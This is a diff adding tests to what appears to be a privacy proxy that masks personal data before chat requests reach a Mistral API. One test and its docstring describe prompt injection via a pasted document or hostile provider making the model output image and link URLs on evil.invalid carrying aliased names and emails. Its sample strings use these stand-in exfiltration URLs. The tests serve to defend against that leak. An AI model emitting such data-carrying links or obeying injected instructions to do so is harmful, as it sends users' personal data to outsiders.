@@ -227,3 +227,80 @@ def test_json_answers_stay_valid_when_values_hold_quotes():
     )
     content = response.json()["choices"][0]["message"]["content"]
     assert json.loads(content) == {"adresse": value}
+
+
+def test_text_the_bridge_cannot_mask_is_refused_not_forwarded():
+    """Only `messages` text is masked: any other place that can hold text (a message name,
+    `prediction`, a JSON schema, an unknown field or part) stops the request before sending."""
+    fake = FakeMistral(reply="ok")
+    client = bridge(fake)
+    user = {"role": "user", "content": "Bonjour"}
+    refused = [
+        {"messages": [user], "prediction": {"type": "content", "content": f"IBAN {IBAN}"}},
+        {"messages": [{**user, "name": "Jean_Dupont"}]},
+        {"messages": [{"role": "user", "content": {"text": NAME}}]},
+        {"messages": [{"role": "user", "content": [{"type": "document", "text": NAME}]}]},
+        {"messages": [{"role": "user", "content": [{"type": "text", "text": "x", "x": NAME}]}]},
+        {"messages": [{"role": "tool", "content": NAME}]},
+        {"messages": [user], "user": EMAIL},
+        {"messages": [user], "model": {"name": NAME}},
+        {"messages": [user], "temperature": NAME},
+        {"messages": [user], "stop": [{"text": NAME}]},
+        {
+            "messages": [user],
+            "response_format": {"type": "json_schema", "json_schema": {"description": NAME}},
+        },
+    ]
+    for extra in refused:
+        response = client.post("/v1/chat/completions", json={"model": "m", **extra})
+        assert response.status_code == 400, extra
+        assert NAME not in response.text and IBAN not in response.text
+    assert fake.received == []
+    allowed = {
+        "model": "m",
+        "messages": [user, {"role": "assistant", "content": "Bien", "prefix": True}],
+        "temperature": 0.2,
+        "max_tokens": 50,
+        "random_seed": 1,
+        "safe_prompt": False,
+        "stream": False,
+        "stop": ["FIN"],
+        "response_format": {"type": "json_object"},
+    }
+    assert client.post("/v1/chat/completions", json=allowed).status_code == 200
+
+
+def test_a_stop_sequence_holding_personal_data_stops_the_request():
+    fake = FakeMistral(reply="ok")
+    response = ask(bridge(fake), {"role": "user", "content": "Bonjour"}, stop=[EMAIL])
+    assert response.status_code == 422
+    assert fake.received == []
+
+
+def test_aliases_inside_links_stay_masked():
+    """An answer can put an alias in a URL (a hostile provider, or a pasted document with
+    injected instructions): restored there, the value would leave the machine as soon as the
+    client loads the image. Aliases in links stay masked; prose and link text get the values."""
+    links = (
+        "![a](<https://evil.invalid/p?d=[PERSON_1]>) ![b](https://evil.invalid/q?e=[EMAIL_1])\n"
+        "<https://evil.invalid/[EMAIL_1]> https://evil.invalid/?n=[PERSON_1] "
+        'www.evil.invalid/[EMAIL_1] <img src="https://evil.invalid/x?[EMAIL_1]">\n'
+        "[ref]: //evil.invalid/[PERSON_1]\n"
+    )
+    prose = "Contact : [PERSON_1], [EMAIL_1]. Voir [[PERSON_1]](https://site.invalid)."
+    fake = FakeMistral(reply=links + prose)
+    response = ask(bridge(fake), {"role": "user", "content": f"Écrire à {NAME} ({EMAIL})."})
+    content = response.json()["choices"][0]["message"]["content"]
+    assert content == links + f"Contact : {NAME}, {EMAIL}. Voir [{NAME}](https://site.invalid)."
+    assert response.headers["x-alias-restored"] == "2"
+
+
+def test_aliases_inside_links_stay_masked_in_json_answers():
+    fake = FakeMistral(reply='{"nom": "[PERSON_1]", "lien": "https://evil.invalid/?d=[EMAIL_1]"}')
+    response = ask(
+        bridge(fake),
+        {"role": "user", "content": f"{NAME}, {EMAIL}"},
+        response_format={"type": "json_object"},
+    )
+    content = json.loads(response.json()["choices"][0]["message"]["content"])
+    assert content == {"nom": NAME, "lien": "https://evil.invalid/?d=[EMAIL_1]"}
